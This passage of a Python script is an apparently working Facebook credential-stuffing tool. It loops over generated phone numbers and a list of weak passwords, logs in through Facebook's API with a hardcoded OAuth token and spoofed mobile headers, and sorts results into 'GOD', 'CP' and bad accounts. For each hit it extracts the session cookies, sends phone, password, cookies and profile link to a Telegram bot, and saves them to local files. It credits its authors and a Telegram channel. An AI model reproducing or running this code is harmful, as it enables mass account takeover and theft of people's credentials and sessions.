    "upgrade-insecure-requests": "1",
    "user-agent": u,
    "viewport-width": "980",
    "X-FB-Connection-Type": "MOBILE.LTE",
    "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    "x-fb-net-hni": "23188",
    "x-fb-sim-hni": "20026",
    "x-fb-device-group": "5120",
    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
    "x-fb-connection-bandwidth": "21085206",
    "x-fb-connection-quality": "EXCELLENT",
    "X-FB-Client-IP": "True",
    "X-FB-Server-Cluster": "True",
    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
    "x-fb-friendly-name": "ViewerReactionsMutation",
    "X-FB-Request-Analytics-Tags": "graphservice",
    "accept-encoding": "gzip, deflate",
}
    
    
    try:
    	response = requests.post(url,data=data,headers=headers).json()
    	
    except:
    	pass
    
    try:
    	idd = response.get("uid") or response.get('error', {}).get('error_data', {}).get('uid')
    except:
    	pass
    ppp = random.choice([احمر, اصفر, ازرق, بنفسجي, ابيض, سماوي, برتقالي, ذهبي, وردي])
    emaili=""
    iddd=""


    if "session_key" in response or 'session_key' in response:
        try:
        	cookie_string = '; '.join([f"{c['name']}={c['value']}" for c in response['session_cookies']])
        except:
        	pass
        get_apps(cookie_string)
        ssend_tele(phone, pas, emaili, idd, cookie_string, apps, dates, apps2, dates2,iddd)



        print(اعادة+f'{اخضر}GOD ACCUONT {phone} | {pas} \n{cookie_string} | {اعادة}{ذهبي}~ @salhpy')


        hit+=1
        message = f"""
ACCUONT OK
phone: {phone}
pas: {pas}
DEV: @salhpy
link: https://www.facebook.com/profile.php?id={idd}
DEV • @salhpy	
cookies: {cookie_string}
app: {apps} | {dates}
{apps2} | {dates2}
Brother: @Xvxsa
BY • https://t.me/S_S_lN
"""
        try:
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         params={"chat_id": ID, "text": message}, timeout=10)
        except:
            pass

        
        if not os.path.exists(fc):
        	os.makedirs(fc)
        ok_file = os.path.join(fc, 'Salh_Ok.txt')
        with open(ok_file, 'a') as f:
        	f.write(f"{phone}|{pas}\nCookie: {cookie_string}\nLink: https://www.facebook.com/profile.php?id={idd}\nApps: {apps}|{dates}\nExpired: {apps2}|{dates2}\nBY: @salhpy\n{'-'*40}\n")

    elif 'www.facebook.com' in str(response):
                
                ssend_teleG(phone, pas, emaili, idd, cookie_string, apps, dates, apps2, dates2,iddd)
                CP+=1
                print(اعادة+f'{ازرق}CP ACCUONT {phone} | {pas} {اعادة}{ذهبي} ~ {اعادة}{ازرق} @salhpy {phone} {pas} {passs}')
                

                message = f"""
ACCUONT CP
phone: {phone}
pas: {pas}
ID=https://www.facebook.com/profile.php?id={idd}
DEV: @salhpy
Brother: @Xvxsa
BY • https://t.me/S_S_lN
DEV • @salhpy
"""
                requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                    params={"chat_id": ID, "text": message})
                ssend_teleG(phone, pas, emaili, idd, cookie_string, apps, dates, apps2, dates2,iddd)

                if not os.path.exists(fc):
                	os.makedirs(fc)
                cp_file = os.path.join(fc, 'Salh_CP.txt')
                with open(cp_file, 'a') as f:
                	f.write(f"{phone}|{pas}\n link • https://www.facebook.com/profile.php?id={idd}\n BY • https://t.me/salhpy\n ")
                
                
    
       
        	

    else:
                bad+=1
                sys.stdout.write(f'\r{اعادة}{ppp}BAD ACCOUNT | Bad {bad} | CP {CP} | Hit {hit} | {اعادة}{ذهبي} {pas} ~{اعادة}{ازرق} @salhpy')
                sys.stdout.flush()
                pass
            
tele()
choose_country()
EXTRA_PASSWORDS = [
    "123456",
    "123456789",
    "112233",
    "11223344",
    "123123",
    "121212",
    "111111",
    "000000",
    "0987654321",
    "0123456789",
    "hamahama",
    "hama1234",
    "hama12345",
    "zaxozaxo",
    "zaxo1234",
    "zaxo12345",
    "kurdkurd",
    "kurd1234",
    "kurd12345",
    "07500750",
    "07800780",
    "07700770",
    "07900790",
    "19801980",
    "19901990",
    "20002000",
    "20102010",
]
def tt():
    global passs
    while True:
        phone, pas = gin()
        u= use()
        chick_Salh(phone, pas,u)
        passs = [random.choice(EXTRA_PASSWORDS) for _ in range(10)]
        for pas in passs:
        	
        	u=use()
        	chick_Salh(phone,pas,u)
os.system('clear')
logn()
for i in range(3):
    t = threading.Thread(target=tt)
    t.start()